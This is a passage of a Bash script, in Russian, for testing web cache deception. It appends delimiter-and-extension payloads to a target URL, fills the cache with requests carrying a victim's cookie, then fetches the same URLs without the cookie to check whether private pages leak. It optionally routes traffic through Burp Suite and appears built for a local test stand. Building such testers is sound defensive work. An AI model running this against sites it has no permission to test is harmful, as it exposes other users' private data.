#!/bin/bash
# =============================================================================
# wcd_gun.sh — Пулемёт для тестирования Web Cache Deception v5.1
# =============================================================================
# Назначение:
#   - Двухфазный обстрел: прогрев кэша (жертва) → проверка (атакующий)
#   - Поддержка проксирования через Burp Suite (порт 8082)
#   - Проверка доступности Burp Suite перед началом работы
#   - ЧЕСТНОЕ отображение: с кукой или без
#   - Полные проверки всех параметров
#   - Подробные пояснения каждого шага в консоли
# =============================================================================

# -----------------------------------------------------------------------------
# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# -----------------------------------------------------------------------------
TARGET=""                                           # Цель атаки
COOKIE=""                                           # Кука для авторизации
DELIMITERS=(";" "." "?" "%00" "%23" "%3F" "%0A" "%09" "%20")  # Разделители
EXTENSIONS=(".css" ".js" ".jpg" ".ico")             # Статические расширения

# Настройки прокси (Burp Suite)
BURP_HOST="127.0.0.1"
BURP_PORT="8082"
USE_PROXY=false                                     # Использовать ли прокси
PROXY_STRING=""                                     # Строка для curl

# -----------------------------------------------------------------------------
# ЦВЕТА ДЛЯ ВЫВОДА
# -----------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# =============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ BURP SUITE
# =============================================================================
check_burp() {
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ПРОВЕРКА BURP SUITE                                         │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}[*] Проверяю доступность Burp Suite на ${BURP_HOST}:${BURP_PORT}...${NC}"
    
    # Проверяем, слушает ли кто-то порт 8082
    if command -v nc &>/dev/null; then
        if nc -z "$BURP_HOST" "$BURP_PORT" 2>/dev/null; then
            echo -e "${GREEN}[+] Burp Suite доступен на ${BURP_HOST}:${BURP_PORT}${NC}"
            
            # Дополнительно проверяем, что это действительно прокси
            local test_response=$(curl -s -o /dev/null -w "%{http_code}" --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
            if [[ "$test_response" == "200" ]]; then
                echo -e "${GREEN}[+] Прокси работает корректно (тестовый запрос прошёл)${NC}"
                return 0
            else
                echo -e "${YELLOW}[!] Порт открыт, но прокси не отвечает (HTTP $test_response)${NC}"
                return 1
            fi
        else
            echo -e "${RED}[!] Burp Suite НЕ ДОСТУПЕН на ${BURP_HOST}:${BURP_PORT}${NC}"
            return 1
        fi
    else
        # Если nc нет, пробуем curl
        local test_response=$(curl -s -o /dev/null -w "%{http_code}" --proxy "http://${BURP_HOST}:${BURP_PORT}" "http://detectportal.firefox.com/success.txt" 2>/dev/null | tr -d '"')
        if [[ "$test_response" == "200" ]]; then
            echo -e "${GREEN}[+] Burp Suite доступен и работает${NC}"
            return 0
        else
            echo -e "${RED}[!] Не удалось проверить Burp Suite (curl вернул $test_response)${NC}"
            return 1
        fi
    fi
}

# =============================================================================
# ЗАПУСК BURP SUITE (если не запущен)
# =============================================================================
launch_burp() {
    echo ""
    echo -e "${YELLOW}[?] Burp Suite не запущен. Запустить его? (y/n)${NC}"
    read -p "> " choice
    
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        echo -e "${CYAN}[*] Пытаюсь запустить Burp Suite...${NC}"
        
        # Проверяем стандартные пути
        if command -v burpsuite &>/dev/null; then
            burpsuite &
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
        elif [[ -f "/usr/bin/burpsuite" ]]; then
            /usr/bin/burpsuite &
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
        elif [[ -f "/opt/BurpSuiteCommunity/BurpSuiteCommunity" ]]; then
            /opt/BurpSuiteCommunity/BurpSuiteCommunity &
            echo -e "${GREEN}[+] Burp Suite запущен в фоне${NC}"
        else
            echo -e "${RED}[!] Не могу найти исполняемый файл Burp Suite${NC}"
            echo -e "${YELLOW}[*] Запусти Burp Suite вручную и нажми Enter${NC}"
            read -p ""
        fi
        
        # Ждём запуска Burp
        echo -e "${CYAN}[*] Жду запуска Burp Suite (10 секунд)...${NC}"
        sleep 10
        
        # Проверяем снова
        if check_burp; then
            return 0
        else
            echo -e "${RED}[!] Burp Suite всё ещё не отвечает${NC}"
            return 1
        fi
    else
        echo -e "${YELLOW}[*] Продолжаю БЕЗ проксирования${NC}"
        return 1
    fi
}

# =============================================================================
# НАСТРОЙКА ПРОКСИ
# =============================================================================
setup_proxy() {
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ НАСТРОЙКА ПРОКСИРОВАНИЯ                                     │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}[?] Использовать Burp Suite для проксирования трафика? (y/n)${NC}"
    echo -e "${CYAN}    Это позволит видеть все запросы в Burp → HTTP History${NC}"
    read -p "> " choice
    
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        if check_burp; then
            USE_PROXY=true
            PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
            echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
            echo -e "${CYAN}[*] Весь трафик будет идти через Burp Suite${NC}"
        else
            if launch_burp; then
                USE_PROXY=true
                PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
                echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
                echo -e "${CYAN}[*] Весь трафик будет идти через Burp Suite${NC}"
            else
                USE_PROXY=false
                PROXY_STRING=""
                echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
            fi
        fi
    else
        USE_PROXY=false
        PROXY_STRING=""
        echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
    fi
}

# =============================================================================
# ВЫПОЛНЕНИЕ CURL ЗАПРОСА (с учётом прокси и HTTPS)
# =============================================================================
do_curl() {
    local url="$1"
    local options="$2"
    
    # Определяем, HTTPS ли это
    if [[ "$url" == https://* ]]; then
        # Для HTTPS добавляем -k (игнорировать ошибки сертификата)
        if [[ -n "$PROXY_STRING" ]]; then
            curl -k $PROXY_STRING $options "$url" 2>/dev/null
        else
            curl -k $options "$url" 2>/dev/null
        fi
    else
        # Для HTTP
        if [[ -n "$PROXY_STRING" ]]; then
            curl $PROXY_STRING $options "$url" 2>/dev/null
        else
            curl $options "$url" 2>/dev/null
        fi
    fi
}

# =============================================================================
# БАННЕР
# =============================================================================
banner() {
    clear
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🔫 WCD GUN v5.1 — пулемёт для тестирования Web Cache Deception${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}🎯 Target:${NC} ${TARGET:-НЕ ЗАДАН}"
    echo -e "  ${YELLOW}🍪 Cookie:${NC} ${COOKIE:-НЕ ЗАДАНА}"
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "  ${MAGENTA}🔌 Proxy:${NC} ${BURP_HOST}:${BURP_PORT} ${GREEN}(Burp Suite)${NC}"
    else
        echo -e "  ${MAGENTA}🔌 Proxy:${NC} ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
    echo ""
}

# =============================================================================
# ПРОВЕРКА ДОСТУПНОСТИ ЦЕЛИ
# =============================================================================
check_target() {
    local url="${1:-$TARGET}"
    
    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] ОШИБКА: Цель не задана. Используй set target <URL>${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] ПРОВЕРКА: Стучусь по адресу $url ...${NC}"
    
    local http_code=$(do_curl "$url" "-s -o /dev/null -w \"%{http_code}\"" | tr -d '"')
    
    if [[ "$http_code" =~ ^(200|302|301|401|403)$ ]]; then
        echo -e "${GREEN}[+] УСПЕХ: Цель доступна (HTTP $http_code)${NC}"
        return 0
    else
        echo -e "${RED}[!] ОШИБКА: Цель недоступна или вернула HTTP $http_code${NC}"
        echo -e "${YELLOW}[*] Возможные причины:${NC}"
        echo -e "${YELLOW}    - Стенд не запущен${NC}"
        echo -e "${YELLOW}    - Неправильный порт${NC}"
        echo -e "${YELLOW}    - Сеть недоступна${NC}"
        if [[ "$USE_PROXY" == true ]]; then
            echo -e "${YELLOW}    - Burp Suite не пропускает трафик${NC}"
        fi
        return 1
    fi
}

# =============================================================================
# ПРОВЕРКА КУКИ (реальная, через тестовый запрос)
# =============================================================================
validate_cookie() {
    if [[ -z "$COOKIE" ]]; then
        return 1
    fi
    
    echo -e "${YELLOW}[*] ПРОВЕРКА КУКИ: Тестирую $COOKIE на $TARGET ...${NC}"
    
    # Делаем тестовый запрос с кукой
    local test_response=$(do_curl "$TARGET" "-s -I -b \"$COOKIE\"")
    local http_code=$(echo "$test_response" | head -1 | awk '{print $2}' | tr -d '\r\n')
    
    if [[ "$http_code" == "200" ]]; then
        echo -e "${GREEN}[+] КУКА ВАЛИДНА: Доступ к $TARGET разрешён (HTTP 200)${NC}"
        return 0
    elif [[ "$http_code" == "302" ]] || [[ "$http_code" == "301" ]]; then
        local location=$(echo "$test_response" | grep -i "^Location:" | awk '{print $2}' | tr -d '\r')
        echo -e "${YELLOW}[!] ПРЕДУПРЕЖДЕНИЕ: Кука ведёт на редирект ($location)${NC}"
        echo -e "${YELLOW}    Это может означать, что кука невалидна или истекла.${NC}"
        return 1
    else
        echo -e "${RED}[!] ОШИБКА: С кукой получен HTTP $http_code${NC}"
        return 1
    fi
}

# =============================================================================
# ДВУХФАЗНЫЙ ОБСТРЕЛ ВСЕМИ РАЗДЕЛИТЕЛЯМИ (С ЧЕСТНЫМИ ПРОВЕРКАМИ)
# =============================================================================
fire() {
    # 1. Проверка цели
    if ! check_target; then
        return 1
    fi
    
    # 2. Проверка куки и определение режима
    local cookie_status=""
    local use_cookie=false
    
    if [[ -n "$COOKIE" ]]; then
        echo ""
        echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${CYAN}│ ПРОВЕРКА ПАРАМЕТРОВ ПЕРЕД ОБСТРЕЛОМ                         │${NC}"
        echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
        
        if validate_cookie; then
            cookie_status="ВАЛИДНАЯ КУКА"
            use_cookie=true
        else
            echo -e "${YELLOW}[?] Кука не прошла проверку. Использовать всё равно? (y/n)${NC}"
            read -p "> " choice
            if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
                cookie_status="НЕВАЛИДНАЯ КУКА (использую принудительно)"
                use_cookie=true
            else
                cookie_status="БЕЗ КУКИ"
                use_cookie=false
                COOKIE=""
            fi
        fi
    else
        cookie_status="БЕЗ КУКИ"
        use_cookie=false
    fi

    local total_tests=$((${#DELIMITERS[@]} * ${#EXTENSIONS[@]}))
    local current=0
    local hits=0
    local bypasses=0
    local misses=0
    local errors=0

    # =========================================================================
    # ФАЗА 1: ПРОГРЕВ КЭША
    # =========================================================================
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔥 ФАЗА 1: ПРОГРЕВ КЭША                                      ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий ЖЕРТВЫ — запись ответов в кэш              ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ РЕЖИМ ПРОГРЕВА: ${WHITE}$cookie_status${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│ Сейчас я делаю ПЕРВЫЙ круг запросов.                        │${NC}"
    if [[ "$use_cookie" == true ]]; then
        echo -e "${CYAN}│ Запросы отправляются ${GREEN}С КУКОЙ${CYAN} (имитация жертвы).             │${NC}"
    else
        echo -e "${CYAN}│ Запросы отправляются ${YELLOW}БЕЗ КУКИ${CYAN} (кука не задана).           │${NC}"
    fi
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}│ Трафик идёт через ${MAGENTA}Burp Suite (${BURP_HOST}:${BURP_PORT})${CYAN}            │${NC}"
    fi
    echo -e "${CYAN}│ Ответы НЕ анализируются — они просто ЗАПИСЫВАЮТСЯ в кэш.    │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((current++))
            local attack_url="${TARGET}${delim}test${ext}"
            
            printf "  [%3d/%3d] ПРОГРЕВ: %s" $current $total_tests "$attack_url"
            
            if [[ "$use_cookie" == true ]]; then
                do_curl "$attack_url" "-s -o /dev/null -b \"$COOKIE\""
                echo -e " ${GREEN}✓ (с кукой)${NC}"
            else
                do_curl "$attack_url" "-s -o /dev/null"
                echo -e " ${YELLOW}✓ (без куки)${NC}"
            fi
            sleep 0.2
        done
    done

    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ФАЗА 1 ЗАВЕРШЕНА.                                           │${NC}"
    echo -e "${CYAN}│ Всего отправлено запросов: $total_tests                              │${NC}"
    if [[ "$use_cookie" == true ]]; then
        echo -e "${CYAN}│ Режим: ${GREEN}С КУКОЙ${CYAN} (имитация жертвы)                          │${NC}"
    else
        echo -e "${CYAN}│ Режим: ${YELLOW}БЕЗ КУКИ${CYAN}                                         │${NC}"
    fi
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}│ Прокси: ${MAGENTA}Burp Suite ${BURP_HOST}:${BURP_PORT}${CYAN}                      │${NC}"
    fi
    echo -e "${CYAN}│ Жду 2 секунды для сохранения кэша...                         │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    sleep 2

    # =========================================================================
    # ФАЗА 2: ПРОВЕРКА КЭША (ВСЕГДА БЕЗ КУКИ — ИМИТАЦИЯ АТАКУЮЩЕГО)
    # =========================================================================
    current=0
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔍 ФАЗА 2: ПРОВЕРКА КЭША                                     ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий АТАКУЮЩЕГО — попытка украсть кэш           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ РЕЖИМ ПРОВЕРКИ: ${RED}ВСЕГДА БЕЗ КУКИ${CYAN} (имитация атакующего)    │${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│ Сейчас я делаю ВТОРОЙ круг запросов.                        │${NC}"
    echo -e "${CYAN}│ Запросы отправляются ${RED}БЕЗ КУКИ${CYAN} — это атакующий.          │${NC}"
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}│ Трафик идёт через ${MAGENTA}Burp Suite (${BURP_HOST}:${BURP_PORT})${CYAN}            │${NC}"
    fi
    echo -e "${CYAN}│ Анализирую заголовок X-Cache-Status.                        │${NC}"
    echo -e "${CYAN}│                                                             │${NC}"
    echo -e "${CYAN}│ ${RED}HIT${CYAN}   — кэш отдал приватные данные (УЯЗВИМОСТЬ)          │${NC}"
    echo -e "${CYAN}│ ${GREEN}BYPASS${CYAN} — защита сработала, кэш обойдён                  │${NC}"
    echo -e "${CYAN}│ ${YELLOW}MISS${CYAN}   — кэш пуст (не сохранилось)                      │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((current++))
            local attack_url="${TARGET}${delim}test${ext}"
            
            # ВСЕГДА БЕЗ КУКИ — атакующий
            local response=$(do_curl "$attack_url" "-s -I")
            local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
            local bypass=$(echo "$response" | grep -i "X-WCD-Bypass" | head -1 | awk '{print $2}' | tr -d '\r')
            local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')
            
            printf "[%3d/%3d] " $current $total_tests
            
            if [[ "$cache_status" == "HIT" ]]; then
                echo -e "${RED}[!] ПРОБИТИЕ!${NC} $attack_url"
                echo -e "         → HTTP $http_code, Cache: ${RED}$cache_status${NC}, Bypass: ${bypass:-нет}"
                echo -e "         ${RED}⚠️  ПОЯСНЕНИЕ: Кэш ОТДАЛ приватные данные БЕЗ КУКИ!${NC}"
                echo -e "         ${RED}    Атакующий УКРАЛ данные жертвы.${NC}"
                echo -e "         ${RED}    УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА.${NC}"
                ((hits++))
            elif [[ "$cache_status" == "BYPASS" ]]; then
                echo -e "${GREEN}[✓] ЗАЩИТА${NC}   $attack_url"
                echo -e "         → HTTP $http_code, Cache: ${GREEN}$cache_status${NC}, Bypass: ${bypass:-нет}"
                echo -e "         ${GREEN}🛡️  ПОЯСНЕНИЕ: Защита сработала!${NC}"
                echo -e "         ${GREEN}    Nginx НЕ ВЗЯЛ ответ из кэша.${NC}"
                echo -e "         ${GREEN}    Атака ОТРАЖЕНА.${NC}"
                ((bypasses++))
            elif [[ "$cache_status" == "MISS" ]]; then
                echo -e "${YELLOW}[?] MISS${NC}     $attack_url"
                echo -e "         → HTTP $http_code, Cache: ${YELLOW}$cache_status${NC}, Bypass: ${bypass:-нет}"
                echo -e "         ${YELLOW}📝 ПОЯСНЕНИЕ: Промах кэша.${NC}"
                echo -e "         ${YELLOW}    Ответ не был закэширован.${NC}"
                ((misses++))
            else
                echo -e "${BLUE}[ ] NO_CACHE${NC} $attack_url"
                echo -e "         → HTTP $http_code, Cache: ${cache_status:-нет}, Bypass: ${bypass:-нет}"
                ((errors++))
            fi
            sleep 0.1
        done
    done

    # =========================================================================
    # ИТОГИ
    # =========================================================================
    echo ""
    echo -e "${WHITE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║  📊 ИТОГИ ОБСТРЕЛА                                             ║${NC}"
    echo -e "${WHITE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "  ${CYAN}Всего проверено векторов:${NC} ${WHITE}$total_tests${NC}"
    echo -e "  ${CYAN}Режим прогрева:${NC} ${WHITE}$cookie_status${NC}"
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "  ${CYAN}Прокси:${NC} ${MAGENTA}Burp Suite ${BURP_HOST}:${BURP_PORT}${NC}"
    fi
    echo ""
    echo -e "  ${RED}🔴 ПРОБИТИЙ (HIT):${NC}        ${RED}$hits${NC}"
    echo -e "  ${GREEN}🟢 ЗАЩИТА (BYPASS):${NC}       ${GREEN}$bypasses${NC}"
    echo -e "  ${YELLOW}🟡 ПРОМАХОВ (MISS):${NC}       ${YELLOW}$misses${NC}"
    echo -e "  ${BLUE}🔵 ОШИБОК/NO_CACHE:${NC}      ${BLUE}$errors${NC}"
    echo ""
    
    echo -e "${WHITE}───────────────────────────────────────────────────────────────${NC}"
    if [[ $hits -gt 0 ]]; then
        echo -e "${RED}⚠️  ВЕРДИКТ: ОБНАРУЖЕНА УЯЗВИМОСТЬ Web Cache Deception!${NC}"
        if [[ "$use_cookie" == true ]]; then
            echo -e "${RED}    Атака с кукой в фазе прогрева и без куки в фазе проверки.${NC}"
        else
            echo -e "${RED}    Атака сработала даже БЕЗ куки на всех этапах.${NC}"
            echo -e "${RED}    Это означает, что бэкенд не проверяет авторизацию.${NC}"
        fi
    elif [[ $bypasses -eq $total_tests ]]; then
        echo -e "${GREEN}✅ ВЕРДИКТ: ЗАЩИТА РАБОТАЕТ ИДЕАЛЬНО!${NC}"
        echo -e "${GREEN}    Все запросы получили BYPASS — кэш не отдал данные.${NC}"
    elif [[ $misses -eq $total_tests ]]; then
        echo -e "${YELLOW}📝 ВЕРДИКТ: КЭШ ПУСТ.${NC}"
        echo -e "${YELLOW}    Ни один ответ не был закэширован.${NC}"
        if [[ "$use_cookie" == false ]]; then
            echo -e "${YELLOW}    Возможно, нужна валидная кука для прогрева.${NC}"
        fi
    else
        echo -e "${BLUE}❓ ВЕРДИКТ: СМЕШАННЫЙ РЕЗУЛЬТАТ.${NC}"
        echo -e "${BLUE}    Изучи вывод выше для анализа.${NC}"
    fi
    echo -e "${WHITE}═══════════════════════════════════════════════════════════════${NC}"
}

# =============================================================================
# ОСТАЛЬНЫЕ ФУНКЦИИ
# =============================================================================

fire_single() {
    local delim="$1"
    
    if [[ -z "$delim" ]]; then
        echo -e "${RED}[!] Укажи разделитель (например, fire_single ;)${NC}"
        return 1
    fi
    
    if ! check_target; then
        return 1
    fi
    
    echo ""
    echo -e "${YELLOW}[*] Обстрел разделителя: '$delim'${NC}"
    echo ""
    
    for ext in "${EXTENSIONS[@]}"; do
        local attack_url="${TARGET}${delim}test${ext}"
        
        # Прогрев
        if [[ -n "$COOKIE" ]]; then
            do_curl "$attack_url" "-s -o /dev/null -b \"$COOKIE\""
            echo -e "  ПРОГРЕВ (с кукой): $attack_url"
        else
            do_curl "$attack_url" "-s -o /dev/null"
            echo -e "  ПРОГРЕВ (без куки): $attack_url"
        fi
        sleep 0.2
        
        # Проверка (без куки)
        local response=$(do_curl "$attack_url" "-s -I")
        local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | awk '{print $2}' | tr -d '\r')
        local bypass=$(echo "$response" | grep -i "X-WCD-Bypass" | awk '{print $2}' | tr -d '\r')
        local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')
        
        if [[ "$cache_status" == "HIT" ]]; then
            echo -e "  ${RED}[!] ПРОБИТИЕ! $attack_url${NC}"
            echo -e "       → HTTP $http_code, Cache: $cache_status, Bypass: ${bypass:-нет}"
        elif [[ "$cache_status" == "BYPASS" ]]; then
            echo -e "  ${GREEN}[✓] ЗАЩИТА   $attack_url${NC}"
            echo -e "       → HTTP $http_code, Cache: $cache_status, Bypass: ${bypass:-нет}"
        elif [[ "$cache_status" == "MISS" ]]; then
            echo -e "  ${YELLOW}[?] MISS     $attack_url${NC}"
            echo -e "       → HTTP $http_code, Cache: $cache_status, Bypass: ${bypass:-нет}"
        else
            echo -e "  [ ] $attack_url"
            echo -e "       → HTTP $http_code, Cache: ${cache_status:-нет}, Bypass: ${bypass:-нет}"
        fi
    done
    echo ""
}

set_target() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи URL цели${NC}"
        return 1
    fi
    TARGET="$1"
    echo -e "${GREEN}[+] Цель установлена: $TARGET${NC}"
    check_target
}

set_cookie() {
    COOKIE="$1"
    if [[ -z "$COOKIE" ]]; then
        echo -e "${YELLOW}[*] Кука очищена${NC}"
    else
        echo -e "${GREEN}[+] Кука установлена: $COOKIE${NC}"
        validate_cookie
    fi
}

set_proxy() {
    if [[ "$1" == "on" || "$1" == "enable" ]]; then
        if check_burp; then
            USE_PROXY=true
            PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
            echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
        else
            echo -e "${RED}[!] Burp Suite недоступен${NC}"
            if launch_burp; then
                USE_PROXY=true
                PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
                echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО: ${BURP_HOST}:${BURP_PORT}${NC}"
            fi
        fi
    elif [[ "$1" == "off" || "$1" == "disable" ]]; then
        USE_PROXY=false
        PROXY_STRING=""
        echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
    else
        echo -e "${YELLOW}[*] Используй: proxy on|off${NC}"
    fi
}

add_delimiter() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи разделитель${NC}"
        return 1
    fi
    DELIMITERS+=("$1")
    echo -e "${GREEN}[+] Разделитель добавлен: $1${NC}"
}

remove_delimiter() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи разделитель для удаления${NC}"
        return 1
    fi
    local new_array=()
    local found=0
    for d in "${DELIMITERS[@]}"; do
        if [[ "$d" != "$1" ]]; then
            new_array+=("$d")
        else
            found=1
        fi
    done
    DELIMITERS=("${new_array[@]}")
    if [[ $found -eq 1 ]]; then
        echo -e "${YELLOW}[-] Разделитель удалён: $1${NC}"
    else
        echo -e "${RED}[!] Разделитель не найден: $1${NC}"
    fi
}

show_delimiters() {
    echo ""
    echo -e "${CYAN}Текущие разделители (${#DELIMITERS[@]}):${NC}"
    local i=1
    for d in "${DELIMITERS[@]}"; do
        echo "  $i) $d"
        ((i++))
    done
    echo ""
}

show_extensions() {
    echo ""
    echo -e "${CYAN}Текущие расширения (${#EXTENSIONS[@]}):${NC}"
    for e in "${EXTENSIONS[@]}"; do
        echo "  - $e"
    done
    echo ""
}

show_target() {
    echo -e "${CYAN}Текущая цель:${NC} ${TARGET:-НЕ ЗАДАНА}"
    if [[ -n "$TARGET" ]]; then
        check_target
    fi
}

show_cookie() {
    if [[ -n "$COOKIE" ]]; then
        echo -e "${CYAN}Текущая кука:${NC} $COOKIE"
        validate_cookie
    else
        echo -e "${CYAN}Текущая кука:${NC} ${YELLOW}НЕ ЗАДАНА${NC}"
    fi
}

show_proxy() {
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}Прокси:${NC} ${GREEN}ВКЛЮЧЕН${NC} (${BURP_HOST}:${BURP_PORT})"
        check_burp
    else
        echo -e "${CYAN}Прокси:${NC} ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
}

show_help() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📖 ДОСТУПНЫЕ КОМАНДЫ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "  set target <URL>       — установить цель"
    echo "  set cookie <COOKIE>    — установить куку (или очистить: set cookie)"
    echo "  target                 — показать и проверить текущую цель"
    echo "  cookie                 — показать и проверить текущую куку"
    echo ""
    echo "  proxy on|off           — включить/выключить проксирование через Burp"
    echo "  proxy status           — показать статус прокси"
    echo ""
    echo "  add <CHAR>             — добавить разделитель"
    echo "  remove <CHAR>          — удалить разделитель"
    echo "  delimiters             — показать список разделителей"
    echo "  extensions             — показать список расширений"
    echo ""
    echo "  fire                   — 🔥 ДВУХФАЗНЫЙ ОБСТРЕЛ (прогрев + проверка)"
    echo "  fire_single <CHAR>     — обстрел одним разделителем"
    echo ""
    echo "  check [URL]            — проверить доступность"
    echo "  clear                  — очистить экран"
    echo "  help                   — это сообщение"
    echo "  exit                   — выход"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# =============================================================================
# ГЛАВНЫЙ ЦИКЛ
# =============================================================================
main() {
    # Если цель передана как аргумент при запуске
    if [[ -n "$1" ]]; then
        TARGET="$1"
    fi
    
    banner
    
    # Настройка прокси
    setup_proxy
    
    # Если цель не задана — спрашиваем
    if [[ -z "$TARGET" ]]; then
        echo ""
        read -p "🎯 Цель (например, http://localhost:8080/profile): " TARGET
    fi
    
    # Проверяем цель сразу
    if [[ -n "$TARGET" ]]; then
        check_target || echo -e "${YELLOW}[*] Продолжаю (смени цель через set target)${NC}"
    fi
    
    # Если кука не задана — спрашиваем
    if [[ -z "$COOKIE" ]]; then
        echo ""
        read -p "🍪 Кука (опционально, Enter чтобы пропустить): " COOKIE
    fi
    
    # Проверяем куку, если задана
    if [[ -n "$COOKIE" ]]; then
        echo ""
        validate_cookie || echo -e "${YELLOW}[*] Кука может быть невалидна${NC}"
    fi
    
    banner
    
    echo -e "${GREEN}[+] Цель: ${WHITE}$TARGET${NC}"
    if [[ -n "$COOKIE" ]]; then
        echo -e "${GREEN}[+] Кука: ${WHITE}$COOKIE${NC}"
    else
        echo -e "${GREEN}[+] Кука: ${YELLOW}НЕ ЗАДАНА${NC}"
    fi
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${GREEN}[+] Прокси: ${MAGENTA}Burp Suite ${BURP_HOST}:${BURP_PORT}${NC}"
    else
        echo -e "${GREEN}[+] Прокси: ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
    echo ""
    echo -e "${CYAN}Введи 'help' для списка команд, 'fire' для двухфазного обстрела${NC}"
    
    # Главный цикл
    while true; do
        echo ""
        read -p "wcd-gun > " cmd arg1 arg2
        
        case $cmd in
            "set")
                case $arg1 in
                    "target") set_target "$arg2" ;;
                    "cookie") set_cookie "$arg2" ;;
                    *) echo -e "${RED}Используй: set target <URL> или set cookie <COOKIE>${NC}" ;;
                esac
                ;;
            "proxy")
                case $arg1 in
                    "on"|"enable") set_proxy "on" ;;
                    "off"|"disable") set_proxy "off" ;;
                    "status") show_proxy ;;
                    *) echo -e "${RED}Используй: proxy on|off|status${NC}" ;;
                esac
                ;;
            "target")
                show_target
                ;;
            "cookie")
                show_cookie
                ;;
            "add")
                add_delimiter "$arg1"
                ;;
            "remove")
                remove_delimiter "$arg1"
                ;;
            "delimiters")
                show_delimiters
                ;;
            "extensions")
                show_extensions
                ;;
            "fire")
                fire
                ;;
            "fire_single")
                fire_single "$arg1"
                ;;
            "check")
                check_target "$arg1"
